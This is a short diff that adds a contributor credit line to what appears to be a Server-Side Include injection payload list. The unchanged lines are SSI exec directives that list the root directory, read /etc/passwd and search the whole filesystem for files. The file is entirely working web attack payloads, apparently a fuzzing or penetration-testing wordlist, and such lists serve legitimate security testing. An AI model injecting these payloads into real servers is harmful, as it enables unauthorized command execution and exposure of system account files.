@@ -1,3 +1,4 @@
+# includes work by Foobar@email.de
 <!--#exec cmd="/bin/ls /" --><br/>
 <!--#exec cmd="cat /etc/passwd" --><br/>
 <!--#exec cmd="find / -name *.* -print" --><br/>
